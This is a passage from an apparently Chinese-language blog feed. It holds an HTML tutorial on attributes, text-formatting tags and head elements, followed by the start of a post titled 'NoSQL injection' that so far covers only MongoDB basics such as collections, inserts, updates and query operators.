<td align="left">表单元素</td>
<td align="left">当元素的值发生变化时触发 JavaScript 事件。</td>
</tr>
</tbody></table>
<h3 id="全局属性"><a href="#全局属性" class="headerlink" title="全局属性"></a>全局属性</h3><p>全局属性是所有 HTML 元素都可以使用的属性。</p>
<p><strong>id</strong>：为元素指定唯一的标识符。(基于<code>css</code>的属性,纯粹使用&lt; DIV &gt;标签而不加任何CSS内容，其效果与用&lt; p&gt;&lt; &#x2F;p &gt;是一样的。)</p>
<pre><code class="highlight plaintext">&lt;div id=&quot;header&quot;&gt;This is the header&lt;/div&gt;</code></pre>

<p><strong>class</strong>：为元素指定一个或多个类名，用于 CSS 或 JavaScript 选择。</p>
<pre><code class="highlight plaintext">&lt;p class=&quot;text highlight&quot;&gt;This is a highlighted text.&lt;/p&gt;</code></pre>

<p><strong>style</strong>：用于直接在元素上应用 CSS 样式。</p>
<pre><code class="highlight plaintext">&lt;p style=&quot;color: blue; font-size: 14px;&quot;&gt;This is a styled paragraph.&lt;/p&gt;</code></pre>

<p><strong>title</strong>：为元素提供额外的提示信息，通常在鼠标悬停时显示。</p>
<pre><code class="highlight plaintext">&lt;abbr title=&quot;HyperText Markup Language&quot;&gt;HTML&lt;/abbr&gt;</code></pre>

<p>**data-***：用于存储自定义数据，通常通过 JavaScript 访问。</p>
<pre><code class="highlight plaintext">&lt;div data-user-id=&quot;12345&quot;&gt;User Info&lt;/div&gt;</code></pre>

<h3 id="特定元素的属性"><a href="#特定元素的属性" class="headerlink" title="特定元素的属性"></a>特定元素的属性</h3><p>某些属性仅适用于特定的 HTML 元素。</p>
<p>**<code>href</code>**（用于 <code>&lt;a&gt;</code> 和 <code>&lt;link&gt;</code> 元素）：指定链接的目标 URL。</p>
<pre><code class="highlight plaintext">&lt;a href=&quot;https://www.example.com&quot;&gt;Visit Example&lt;/a&gt;</code></pre>

<p>**<code>src</code>**（用于 <code>&lt;img&gt;</code>, <code>&lt;script&gt;</code>, <code>&lt;iframe&gt;</code> 等元素）：指定外部资源的 URL。</p>
<pre><code class="highlight plaintext">&lt;img src=&quot;image.jpg&quot; alt=&quot;An example image&quot;&gt;</code></pre>

<p>**<code>alt</code>**（用于 <code>&lt;img&gt;</code> 元素）：为图像提供替代文本，当图像无法显示时显示。</p>
<pre><code class="highlight plaintext">&lt;img src=&quot;image.jpg&quot; alt=&quot;An example image&quot;&gt;</code></pre>

<p>**<code>type</code>**（用于 <code>&lt;input&gt;</code> 和 <code>&lt;button&gt;</code> 元素）：指定输入控件的类型。</p>
<pre><code class="highlight plaintext">&lt;input type=&quot;text&quot; placeholder=&quot;Enter your name&quot;&gt;</code></pre>

<p>**<code>value</code>**（用于 <code>&lt;input&gt;</code>, <code>&lt;button&gt;</code>, <code>&lt;option&gt;</code> 等元素）：指定元素的初始值。</p>
<pre><code class="highlight plaintext">&lt;input type=&quot;text&quot; value=&quot;Default Value&quot;&gt;</code></pre>

<p>**<code>disabled</code>**（用于表单元素）：禁用元素，使其不可交互。</p>
<pre><code class="highlight plaintext">&lt;input type=&quot;text&quot; disabled&gt;</code></pre>

<p>**<code>checked</code>**（用于 <code>&lt;input type=&quot;checkbox&quot;&gt;</code> 和 <code>&lt;input type=&quot;radio&quot;&gt;</code>）：指定复选框或单选按钮是否被选中。</p>
<pre><code class="highlight plaintext">&lt;input type=&quot;checkbox&quot; checked&gt;</code></pre>

<p>**<code>placeholder</code>**（用于 <code>&lt;input&gt;</code> 和 <code>&lt;textarea&gt;</code> 元素）：在输入框中显示提示文本。</p>
<pre><code class="highlight plaintext">&lt;input type=&quot;text&quot; placeholder=&quot;Enter your email&quot;&gt;</code></pre>

<p>**<code>target</code>**（用于 <code>&lt;a&gt;</code> 和 <code>&lt;form&gt;</code> 元素）：指定链接或表单提交的目标窗口或框架。</p>
<pre><code class="highlight plaintext">&lt;a href=&quot;https://www.example.com&quot; target=&quot;_blank&quot;&gt;Open in new tab&lt;/a&gt;</code></pre>

<h3 id="布尔属性"><a href="#布尔属性" class="headerlink" title="布尔属性"></a>布尔属性</h3><p>布尔属性是指不需要值的属性，它们的存在即表示 true，不存在则表示 false。</p>
<p><strong>disabled</strong>：禁用元素。</p>
<pre><code class="highlight plaintext">&lt;input type=&quot;text&quot; disabled&gt;</code></pre>

<p><strong>readonly</strong>：使输入框只读。</p>
<pre><code class="highlight plaintext">&lt;input type=&quot;text&quot; readonly&gt;</code></pre>

<p><strong>required</strong>：指定输入字段为必填项。</p>
<pre><code class="highlight plaintext">&lt;input type=&quot;text&quot; required&gt;</code></pre>

<p>**<code>autoplay</code>**（用于 <code>&lt;audio&gt;</code> 和 <code>&lt;video&gt;</code> 元素）：自动播放媒体。</p>
<pre><code class="highlight plaintext">&lt;video src=&quot;video.mp4&quot; autoplay&gt;&lt;/video&gt;</code></pre>

<h3 id="自定义属性"><a href="#自定义属性" class="headerlink" title="自定义属性"></a>自定义属性</h3><p>HTML5 引入了 <strong>data-*</strong> 属性，允许开发者自定义属性来存储额外的数据。</p>
<p>**data-***：用于存储自定义数据，通常通过 JavaScript 访问。</p>
<pre><code class="highlight plaintext">&lt;div data-user-id=&quot;12345&quot; data-role=&quot;admin&quot;&gt;User Info&lt;/div&gt;</code></pre>

<h3 id="事件处理属性"><a href="#事件处理属性" class="headerlink" title="事件处理属性"></a>事件处理属性</h3><p>HTML 元素可以通过事件处理属性来响应特定的事件，如点击、鼠标悬停等。</p>
<p><strong>onclick</strong>：当用户点击元素时触发。</p>
<pre><code class="highlight plaintext">&lt;button onclick=&quot;alert(&#x27;Button clicked!&#x27;)&quot;&gt;Click Me&lt;/button&gt;</code></pre>

<p><strong>onmouseover</strong>：当用户将鼠标悬停在元素上时触发。</p>
<pre><code class="highlight plaintext">&lt;div onmouseover=&quot;this.style.backgroundColor=&#x27;yellow&#x27;&quot;&gt;Hover over me&lt;/div&gt;</code></pre>

<p><strong>onchange</strong>：当元素的值发生变化时触发。</p>
<pre><code class="highlight plaintext">&lt;input type=&quot;text&quot; onchange=&quot;alert(&#x27;Value changed!&#x27;)&quot;&gt;</code></pre>

<h2 id="为网页加亿点点细节"><a href="#为网页加亿点点细节" class="headerlink" title="为网页加亿点点细节"></a>为网页加亿点点细节</h2><h3 id="水平线"><a href="#水平线" class="headerlink" title="水平线"></a>水平线</h3><p><code>&lt;hr&gt;</code> 标签在 HTML 页面中创建水平线。</p>
<p><code>hr </code>元素可用于分隔内容。</p>
<h3 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h3><p>可以将注释插入 HTML 代码中，这样可以提高其可读性，使代码更易被人理解。浏览器会忽略注释，也不会显示它们。</p>
<p>注释写法如下:</p>
<ul>
<li>实例</li>
</ul>
<!-- 这是一个注释 -->

<p><strong>注释:</strong> 开始括号之后（左边的括号）需要紧跟一个叹号 <strong>!</strong> (英文标点符号)，结束括号之前（右边的括号）不需要，合理地使用注释可以对未来的代码编辑工作产生帮助。</p>
<h3 id="字体"><a href="#字体" class="headerlink" title="字体"></a>字体</h3><h4 id="HTML-文本格式化标签"><a href="#HTML-文本格式化标签" class="headerlink" title="HTML 文本格式化标签"></a>HTML 文本格式化标签</h4><table>
<thead>
<tr>
<th align="left">标签</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><b></b></td>
<td align="left">定义粗体文本</td>
</tr>
<tr>
<td align="left"><em>(大号斜体)</em></td>
<td align="left">定义着重文字</td>
</tr>
<tr>
<td align="left"><i></i></td>
<td align="left">定义斜体字</td>
</tr>
<tr>
<td align="left"><small></small></td>
<td align="left">定义小号字</td>
</tr>
<tr>
<td align="left"><strong>(加粗)</strong></td>
<td align="left">定义加重语气</td>
</tr>
<tr>
<td align="left"><sub></sub></td>
<td align="left">定义下标字</td>
</tr>
<tr>
<td align="left"><sup></sup></td>
<td align="left">定义上标字</td>
</tr>
<tr>
<td align="left"><ins>(下划线)</ins></td>
<td align="left">定义插入字</td>
</tr>
<tr>
<td align="left"><del>(横线)</del></td>
<td align="left">定义删除字</td>
</tr>
</tbody></table>
<h4 id="HTML-“计算机输出”-标签"><a href="#HTML-“计算机输出”-标签" class="headerlink" title="HTML “计算机输出” 标签"></a>HTML “计算机输出” 标签</h4><table>
<thead>
<tr>
<th align="left">标签</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><code></code></td>
<td align="left">定义计算机代码</td>
</tr>
<tr>
<td align="left"><kbd></kbd></td>
<td align="left">定义键盘码</td>
</tr>
<tr>
<td align="left"><samp></samp></td>
<td align="left">定义计算机代码样本</td>
</tr>
<tr>
<td align="left"><var></var></td>
<td align="left">定义变量</td>
</tr>
<tr>
<td align="left"><pre></pre></td>
<td align="left">定义预格式文本</td>
</tr>
</tbody></table>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250316125805549.png" alt="image-20250316125805549"></p>
<h4 id="HTML-引文-引用-及标签定义"><a href="#HTML-引文-引用-及标签定义" class="headerlink" title="HTML 引文, 引用, 及标签定义"></a>HTML 引文, 引用, 及标签定义</h4><table>
<thead>
<tr>
<th align="left">标签</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><abdr><acronym></acronym></abdr></td>
<td align="left">定义缩写</td>
</tr>
<tr>
<td align="left"><address></address></td>
<td align="left">定义地址</td>
</tr>
<tr>
<td align="left"><bdo></bdo></td>
<td align="left">定义文字方向</td>
</tr>
<tr>
<td align="left"><blockquote></blockquote></td>
<td align="left">定义长的引用</td>
</tr>
<tr>
<td align="left"><q></q></td>
<td align="left">定义短的引用语</td>
</tr>
<tr>
<td align="left"><cite></cite></td>
<td align="left">定义引用、引证</td>
</tr>
<tr>
<td align="left"><dfn></dfn></td>
<td align="left">定义一个定义项目。</td>
</tr>
</tbody></table>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250316125715542.png" alt="image-20250316125715542"></p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250316132652922.png" alt="image-20250316132652922"></p>
<h2 id="HTML-头部"><a href="#HTML-头部" class="headerlink" title="HTML 头部"></a>HTML 头部</h2><h3 id="HTML-base-元素"><a href="#HTML-base-元素" class="headerlink" title="HTML base 元素"></a>HTML base 元素</h3><p><code>&lt;base&gt;</code> 标签描述了基本的链接地址/链接目标，该标签作为HTML文档中所有的链接标签的默认链接:</p>
<ul>
<li>实例</li>
</ul>
<pre><code class="highlight html"><span class="tag">&lt;<span class="name">head</span>&gt;</span> <span class="tag">&lt;<span class="name">base</span> <span class="attr">href</span>=<span class="string">&quot;http://www.runoob.com/images/&quot;</span> <span class="attr">target</span>=<span class="string">&quot;_blank&quot;</span>&gt;</span> <span class="tag">&lt;/<span class="name">head</span>&gt;</span></code></pre>

<hr>
<h3 id="HTML-link-元素"><a href="#HTML-link-元素" class="headerlink" title="HTML  link 元素"></a>HTML  link 元素</h3><p><code>&lt;link&gt; </code>标签定义了文档与外部资源之间的关系。</p>
<p><code>&lt;link&gt; </code>标签通常用于链接到样式表:</p>
<p>可以在左侧显示logo等图片</p>
<ul>
<li>实例</li>
</ul>
<pre><code class="highlight html"><span class="tag">&lt;<span class="name">head</span>&gt;</span> <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;icon&quot;</span> <span class="attr">href</span>=<span class="string">&quot;图片url&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">title</span>&gt;</span>这是一个带图片的标签<span class="tag">&lt;/<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">head</span>&gt;</span></code></pre>

<pre><code class="highlight html"><span class="tag">&lt;<span class="name">head</span>&gt;</span> <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span> <span class="attr">href</span>=<span class="string">&quot;mystyle.css&quot;</span>&gt;</span> <span class="tag">&lt;/<span class="name">head</span>&gt;</span></code></pre>

<hr>
<h3 id="HTML-style-元素"><a href="#HTML-style-元素" class="headerlink" title="HTML  style 元素"></a>HTML  style 元素</h3><p><code>&lt;style&gt;</code> 标签定义了HTML文档的样式文件引用地址.</p>
<p>在<code>&lt;style&gt; </code>元素中你也可以直接添加样式来渲染 HTML 文档:</p>
<ul>
<li>实例</li>
</ul>
<pre><code class="highlight html"><span class="tag">&lt;<span class="name">head</span>&gt;</span> <span class="tag">&lt;<span class="name">style</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span>&gt;</span><span class="language-css"> </span>
<span class="language-css">    <span class="selector-tag">body</span> &#123;<span class="attribute">background-color</span>:yellow;&#125; </span>
<span class="language-css">    <span class="selector-tag">p</span> &#123;<span class="attribute">color</span>:blue&#125; </span>
<span class="language-css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span>
<span class="tag">&lt;/<span class="name">head</span>&gt;</span></code></pre>

<hr>
<h3 id="HTML-meta-元素"><a href="#HTML-meta-元素" class="headerlink" title="HTML meta 元素"></a>HTML meta 元素</h3><p>meta标签描述了一些基本的元数据。</p>
<p><code>&lt;meta&gt; </code>标签提供了元数据.元数据也不显示在页面上，但会被浏览器解析。</p>
<p>META 元素通常用于指定网页的描述，关键词，文件的最后修改时间，作者，和其他元数据。</p>
<p>元数据可以使用于浏览器（如何显示内容或重新加载页面），搜索引擎（关键词），或其他Web服务。</p>
<p><code>&lt;meta&gt;</code> 一般放置于 <code>&lt;head&gt;</code> 区域</p>
<ul>
<li><code>&lt;meta&gt;</code> 标签- 使用实例</li>
</ul>
<p>为搜索引擎定义关键词:</p>
<pre><code class="highlight plaintext">&lt;meta name=&quot;keywords&quot; content=&quot;HTML, CSS, XML, XHTML, JavaScript&quot;&gt;</code></pre>

<p>为网页定义描述内容:</p>
<pre><code class="highlight plaintext">&lt;meta name=&quot;description&quot; content=&quot;免费 Web &amp; 编程 教程&quot;&gt;</code></pre>

<p>定义网页作者:</p>
<pre><code class="highlight plaintext">&lt;meta name=&quot;author&quot; content=&quot;Runoob&quot;&gt;</code></pre>

<p>每30秒钟刷新当前页面:</p>
<pre><code class="highlight plaintext">&lt;meta http-equiv=&quot;refresh&quot; content=&quot;30&quot;&gt;</code></pre>

<hr>
<h3 id="HTML-script-元素"><a href="#HTML-script-元素" class="headerlink" title="HTML script 元素"></a>HTML script 元素</h3><pre><code class="highlight plaintext">&lt;script&gt;标签用于加载脚本文件，如： JavaScript。

&lt;script&gt; 元素在以后的章节中会详细描述。</code></pre>

<hr>
<p><strong>总结:HTML head 元素</strong></p>
<table>
<thead>
<tr>
<th align="left">标签</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><head></head></td>
<td align="left">定义了文档的信息</td>
</tr>
<tr>
<td align="left"><title></title></td>
<td align="left">定义了文档的标题</td>
</tr>
<tr>
<td align="left"><base></td>
<td align="left">定义了页面链接标签的默认链接地址</td>
</tr>
<tr>
<td align="left"><link></td>
<td align="left">定义了一个文档和外部资源之间的关系</td>
</tr>
<tr>
<td align="left"><meta></td>
<td align="left">定义了HTML文档中的元数据</td>
</tr>
<tr>
<td align="left"><script></td>
<td align="left">定义了客户端的脚本文件</td>
</tr>
<tr>
<td align="left"><style></td>
<td align="left">定义了HTML文档的样式文件</td>
</tr>
</tbody></table>
<blockquote>
<p>[!IMPORTANT]</p>
</blockquote>
<p>head 标签用于定义文档头部，它是所有头部元素的容器。<head> 中的元素可以引用脚本、指示浏览器在哪里找到样式表、提供元信息等等。</p>
<p>如：</p>
<pre><code class="highlight plaintext">&lt;html&gt;
  &lt;head&gt;
     &lt;title&gt;文档标题&lt;/title&gt;
  &lt;/head&gt;
&lt;/html&gt;</code></pre>

<p>header 标签用于定义文档的页眉（介绍信息）。</p>
<p>如：</p>
<pre><code class="highlight plaintext">&lt;html&gt;
  &lt;body&gt;
    &lt;header&gt;
        &lt;p&gt;段落&lt;/p&gt;
        &lt;h1&gt;一级标题&lt;/h1&gt;
    &lt;/header&gt;
  &lt;/body&gt;
&lt;/html&gt;</code></pre>

<p>注意千万不要弄混。</p>
</script></td></tr></tbody></table>]]></content>
      <tags>
        <tag>-HTML -Web前端</tag>
      </tags>
  </entry>
  <entry>
    <title>Nosql注入</title>
    <url>/2025/07/01/Nosql%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<h1 id="N0sql"><a href="#N0sql" class="headerlink" title="N0sql"></a>N0sql</h1><p>No only SQL,目前最流行的nosql产品是MongoDB</p>
<p>一种数据结构由键值对组成的文档</p>
<p>和json类似</p>
<pre><code class="highlight json"><span class="punctuation">&#123;</span>
    <span class="attr">&quot;_id&quot;</span> <span class="punctuation">:</span> ObjectId(<span class="string">&quot;60fa854cf8aaaf4f21049148&quot;</span>)<span class="punctuation">,</span>
    <span class="attr">&quot;name&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;whoami&quot;</span><span class="punctuation">,</span>
    <span class="attr">&quot;description&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;the admin user&quot;</span><span class="punctuation">,</span>
    <span class="attr">&quot;age&quot;</span> <span class="punctuation">:</span> <span class="number">19</span><span class="punctuation">,</span>
    <span class="attr">&quot;status&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;A&quot;</span><span class="punctuation">,</span>
    <span class="attr">&quot;groups&quot;</span> <span class="punctuation">:</span> <span class="punctuation">[</span>
        <span class="string">&quot;admins&quot;</span><span class="punctuation">,</span>
        <span class="string">&quot;users&quot;</span>
    <span class="punctuation">]</span>
<span class="punctuation">&#125;</span></code></pre>

<h2 id="MongoDB-基础概念解析"><a href="#MongoDB-基础概念解析" class="headerlink" title="MongoDB 基础概念解析"></a>MongoDB 基础概念解析</h2><p>不管我们学习什么数据库都应该学习其中的基础概念，在 MongoDB 中基本的概念有文档、集合、数据库，如下表所示：</p>
<table>
<thead>
<tr>
<th>SQL 概念</th>
<th>MongoDB 概念</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>database</td>
<td>database</td>
<td>数据库</td>
</tr>
<tr>
<td>table</td>
<td>collection</td>
<td>数据库表&#x2F;集合</td>
</tr>
<tr>
<td>row</td>
<td>document</td>
<td>数据记录行&#x2F;文档</td>
</tr>
<tr>
<td>column</td>
<td>field</td>
<td>数据字段&#x2F;域</td>
</tr>
<tr>
<td>index</td>
<td>index</td>
<td>索引</td>
</tr>
<tr>
<td>table joins</td>
<td></td>
<td>表连接，MongoDB 不支持</td>
</tr>
<tr>
<td>primary key</td>
<td>primary key</td>
<td>主键，MongoDB 自动将 <code>_id</code> 字段设置为主键</td>
</tr>
</tbody></table>
<p>下表列出了关系型数据库 RDBMS 与 MongoDB 之间对应的术语：</p>
<table>
<thead>
<tr>
<th>RDBMS</th>
<th>MongoDB</th>
</tr>
</thead>
<tbody><tr>
<td>数据库</td>
<td>数据库</td>
</tr>
<tr>
<td>表格</td>
<td>集合</td>
</tr>
<tr>
<td>行</td>
<td>文档</td>
</tr>
<tr>
<td>列</td>
<td>字段</td>
</tr>
<tr>
<td>表联合</td>
<td>嵌入文档</td>
</tr>
<tr>
<td>主键</td>
<td>主键（MongoDB 提供了 key 为 _id）</td>
</tr>
</tbody></table>
<h3 id="数据库（Database）"><a href="#数据库（Database）" class="headerlink" title="数据库（Database）"></a>数据库（Database）</h3><p>个 MongoDB 中可以建立多个数据库。MongoDB 的单个实例可以容纳多个独立的数据库，每一个都有自己的集合和权限，不同的数据库也放置在不同的文件中。</p>
<p>使用 <code>show dbs</code> 命令可以显示所有数据库的列表：</p>
<pre><code class="highlight plaintext">$ ./mongo
MongoDB shell version: 3.0.6
connecting to: test
&gt; show dbs
admin   0.078GB
config  0.078GB
local   0.078GB
&gt;</code></pre>

<p>执行 <code>db</code> 命令可以显示当前数据库对象或集合：</p>
<pre><code class="highlight plaintext">$ ./mongo
MongoDB shell version: 3.0.6
connecting to: test
&gt; db
test
&gt;</code></pre>

<h3 id="文档（Document）"><a href="#文档（Document）" class="headerlink" title="文档（Document）"></a>文档（Document）</h3><p>文档是一组键值（key-value）对，类似于 RDBMS 关系型数据库中的一行。MongoDB 的文档不需要设置相同的字段，并且相同的字段不需要相同的数据类型，这与关系型数据库有很大的区别，也是 MongoDB 非常突出的特点。</p>
<p>一个简单的文档例子如下：</p>
<pre><code class="highlight plaintext">&#123;&quot;name&quot;:&quot;whoami&quot;, &quot;age&quot;:19&#125;</code></pre>

<h3 id="集合（Collection）"><a href="#集合（Collection）" class="headerlink" title="集合（Collection）"></a>集合（Collection）</h3><p>集合就是 MongoDB 文档组，类似于 RDBMS 关系数据库管理系统中的表格。集合存在于数据库中，集合没有固定的结构，这意味着你在对集合可以插入不同格式和类型的数据。</p>
<p>比如，我们可以将以下不同数据结构的文档插入到集合中：</p>
<pre><code class="highlight plaintext">&#123;&quot;name&quot;:&quot;whoami&quot;&#125;
&#123;&quot;name&quot;:&quot;bunny&quot;, &quot;age&quot;:19&#125;
&#123;&quot;name&quot;:&quot;bob&quot;, &quot;age&quot;:20, &quot;groups&quot;:[&quot;admins&quot;,&quot;users&quot;]&#125;</code></pre>

<p>当插入一个文档时，集合就会被自动创建。</p>
<p>如果我们要查看已有集合，可以使用 <code>show collections</code> 或 <code>show tables</code> 命令：</p>
<pre><code class="highlight plaintext">&gt; show collections
all_users
&gt; show tables
all_users
&gt;</code></pre>

<h2 id="MongoDB基础操作"><a href="#MongoDB基础操作" class="headerlink" title="MongoDB基础操作"></a>MongoDB基础操作</h2><h3 id="创建数据库"><a href="#创建数据库" class="headerlink" title="创建数据库"></a>创建数据库</h3><pre><code class="highlight plaintext">use DATABASENAME</code></pre>

<p>一键创建；若已存在就连接并切换到指定数据库</p>
<h3 id="创建集合"><a href="#创建集合" class="headerlink" title="创建集合"></a>创建集合</h3><pre><code class="highlight plaintext">db.createCollection(name,options)</code></pre>

<ul>
<li>name：要创建的集合名称</li>
<li>options：可选参数，指定有关内存大小及索引的选项</li>
</ul>
<p>如下实例，我们在 users 数据库中创建一个 all_users 集合：</p>
<pre><code class="highlight plaintext">&gt; use users
switched to db users
&gt; db.createCollection(&quot;all_users&quot;)
&#123; &quot;ok&quot; : 1 &#125;
&gt;</code></pre>

<h3 id="插入文档"><a href="#插入文档" class="headerlink" title="插入文档"></a>插入文档</h3><pre><code class="highlight plaintext">db.COLLECTION_NAME.insert(document)</code></pre>

<p>如下实例，我们向存储在 users 数据库的 all_users 集合中插入一个文档：</p>
<pre><code class="highlight plaintext">&gt; db.all_users.insert(&#123;name: &#x27;whoami&#x27;, 
    description: &#x27;the admin user&#x27;,
    age: 19,
    status: &#x27;A&#x27;,
    groups: [&#x27;admins&#x27;, &#x27;users&#x27;]
&#125;)</code></pre>

<p>我们也可以将文档数据定义为一个变量，然后再执行插入操作将变量插入。</p>
<h3 id="更新文档"><a href="#更新文档" class="headerlink" title="更新文档"></a>更新文档</h3><p>在 MongoDB 中我们可以使用 <code>update()</code> 或 <code>save()</code> 方法来更新集合中的文档。</p>
<ul>
<li><strong>update() 方法</strong></li>
</ul>
<p>update() 方法用于更新已存在的文档。语法格式如下：</p>
<pre><code class="highlight plaintext">db.collection.update(
   &lt;query&gt;,
   &lt;update&gt;,
   &#123;
     upsert: &lt;boolean&gt;,
     multi: &lt;boolean&gt;,
     writeConcern: &lt;document&gt;
   &#125;
)</code></pre>

<p>参数说明：</p>
<ul>
<li>query：update 操作的查询条件，类似 sql update 语句中 where 子句后面的内容。</li>
<li>update：update 操作的对象和一些更新的操作符（如 <code>$set</code>）等，可以理解为 sql update 语句中 set 关键字后面的内容。</li>
<li>multi：可选，默认是 false，只更新找到的第一条记录，如果这个参数为 true，就把按条件查出来多条记录全部更新。</li>
</ul>
<p>接着我们通过 update() 方法来将年龄 age 从 19 更新到 20：</p>
<pre><code class="highlight plaintext">&gt; db.lover.update(&#123;&#x27;age&#x27;:19&#125;, &#123;$set:&#123;&#x27;age&#x27;:20&#125;&#125;)
WriteResult(&#123; &quot;nMatched&quot; : 0, &quot;nUpserted&quot; : 0, &quot;nModified&quot; : 0 &#125;)
&gt;
&gt; db.all_users.find().pretty()
&#123;
    &quot;_id&quot; : ObjectId(&quot;60fa854cf8aaaf4f21049148&quot;),
    &quot;name&quot; : &quot;whoami&quot;,
    &quot;description&quot; : &quot;the admin user&quot;,
    &quot;age&quot; : 20,
    &quot;status&quot; : &quot;A&quot;,
    &quot;groups&quot; : [
        &quot;admins&quot;,
        &quot;users&quot;
    ]
&#125;
&gt;</code></pre>

<p>成功将 age 从 19 改为了 20。</p>
<p>以上语句只会修改第一条发现的文档，如果你要修改多条相同的文档，则需要设置 multi 参数为 true。</p>
<pre><code class="highlight plaintext">&gt; db.lover.update(&#123;&#x27;age&#x27;:&#x27;19&#x27;&#125;, &#123;$set:&#123;&#x27;age&#x27;:20&#125;&#125;, &#123;multi:true&#125;)</code></pre>

<ul>
<li><strong>save() 方法</strong></li>
</ul>
<p>save() 方法通过传入的文档来替换已有文档，<code>_id</code> 主键存在就更新，不存在就插入。语法格式如下：</p>
<pre><code class="highlight plaintext">db.collection.save(
   &lt;document&gt;,
   &#123;
     writeConcern: &lt;document&gt;
   &#125;
)</code></pre>

<p>参数说明：</p>
<ul>
<li>document：文档数据。</li>
</ul>
<p>如下实例中我们替换了 <code>_id</code> 为 60fa854cf8aaaf4f21049148 的文档数据：</p>
<pre><code class="highlight plaintext">&gt; db.all_users.save(&#123;
    &quot;_id&quot; : ObjectId(&quot;60fa854cf8aaaf4f21049148&quot;),
    &quot;name&quot; : &quot;whoami&quot;,
    &quot;description&quot; : &quot;the admin user&quot;,
    &quot;age&quot; : 21,
    &quot;status&quot; : &quot;A&quot;,
    &quot;groups&quot; : [
        &quot;admins&quot;,
        &quot;users&quot;
    ]
&#125;)</code></pre>

<h3 id="查询文档"><a href="#查询文档" class="headerlink" title="查询文档"></a>查询文档</h3><pre><code class="highlight plaintext">db.collection.find(query,projection)</code></pre>

<p>参数说明：</p>
<ul>
<li>query：可选，使用查询操作符指定查询条件，相当于 sql select 语句中的 where 子句。</li>
<li>projection：可选，使用投影操作符指定返回的键。</li>
</ul>
<p>如下实例我们查询了集合 all_users 中的 age 为 20 的数据：</p>
<pre><code class="highlight plaintext">&gt; db.all_users.find(&#123;&quot;age&quot;:&quot;20&quot;&#125;)
&#123; &quot;_id&quot; : ObjectId(&quot;60fa854cf8aaaf4f21049148&quot;), &quot;name&quot; : &quot;whoami&quot;, &quot;description&quot; : &quot;the admin user&quot;, &quot;age&quot; : &quot;20&quot;, &quot;status&quot; : &quot;A&quot;, &quot;groups&quot; : [ &quot;admins&quot;, &quot;users&quot; ] &#125;
&gt;</code></pre>

<p>如果你需要以易读的方式来读取数据，可以使用 <code>pretty()</code> 方法以格式化的方式来显示所有文档：</p>
<pre><code class="highlight plaintext">&gt; db.all_users.find(&#123;&quot;age&quot;:20&#125;).pretty()
&#123;
    &quot;_id&quot; : ObjectId(&quot;60fa854cf8aaaf4f21049148&quot;),
    &quot;name&quot; : &quot;whoami&quot;,
    &quot;description&quot; : &quot;the admin user&quot;,
    &quot;age&quot; : 20,
    &quot;status&quot; : &quot;A&quot;,
    &quot;groups&quot; : [
        &quot;admins&quot;,
        &quot;users&quot;
    ]
&#125;
&gt;</code></pre>

<h4 id="MongoDB-与-RDBMS-之间的类比比较"><a href="#MongoDB-与-RDBMS-之间的类比比较" class="headerlink" title="MongoDB 与 RDBMS 之间的类比比较"></a>MongoDB 与 RDBMS 之间的类比比较</h4><p>如果你熟悉常规的 SQL 数据，通过下表可以更好的理解 MongoDB 的条件语句查询：</p>
<table>
<thead>
<tr>
<th>操作</th>
<th>格式</th>
<th>范例</th>
<th>RDBMS 中的类似语句</th>
</tr>
</thead>
<tbody><tr>
<td>等于</td>
<td><code>&#123;&lt;key&gt;:&lt;value&gt;&#125;</code></td>
<td><code>db.love.find(&#123;&quot;name&quot;:&quot;whoami&quot;&#125;).pretty()</code></td>
<td><code>where name = &#39;whoami&#39;</code></td>
</tr>
<tr>
<td>小于</td>
<td><code>&#123;&lt;key&gt;:&#123;$lt:&lt;value&gt;&#125;&#125;</code></td>
<td><code>db.love.find(&#123;&quot;age&quot;:&#123;$lt:19&#125;&#125;).pretty()</code></td>
<td><code>where age &lt; 19</code></td>
</tr>
<tr>
<td>小于或等于</td>
<td><code>&#123;&lt;key&gt;:&#123;$lte:&lt;value&gt;&#125;&#125;</code></td>
<td><code>db.love.find(&#123;&quot;age&quot;:&#123;$lte:19&#125;&#125;).pretty()</code></td>
<td><code>where likes &lt;= 19</code></td>
</tr>
<tr>
<td>大于</td>
<td><code>&#123;&lt;key&gt;:&#123;$gt:&lt;value&gt;&#125;&#125;</code></td>
<td><code>db.love.find(&#123;&quot;age&quot;:&#123;$gt:19&#125;&#125;).pretty()</code></td>
<td><code>where likes &gt; 19</code></td>
</tr>
<tr>
<td>大于或等于</td>
<td><code>&#123;&lt;key&gt;:&#123;$gte:&lt;value&gt;&#125;&#125;</code></td>
<td><code>db.love.find(&#123;&quot;age&quot;:&#123;$gte:19&#125;&#125;).pretty()</code></td>
<td><code>where likes &gt;= 19</code></td>
</tr>
<tr>
<td>不等于</td>
<td><code>&#123;&lt;key&gt;:&#123;$ne:&lt;value&gt;&#125;&#125;</code></td>
<td><code>db.love.find(&#123;&quot;age&quot;:&#123;$ne:19&#125;&#125;).pretty()</code></td>
<td><code>where likes != 19</code></td>
</tr>
</tbody></table>
<p>而查询时的<strong>AND语句</strong>的表示即用<code>,</code>隔开多个键值对</p>
<p>语法格式如下：</p>
<pre><code class="highlight plaintext">&gt; db.all_users.find(&#123;&quot;status&quot;:&quot;B&quot;, &quot;age&quot;:20&#125;)
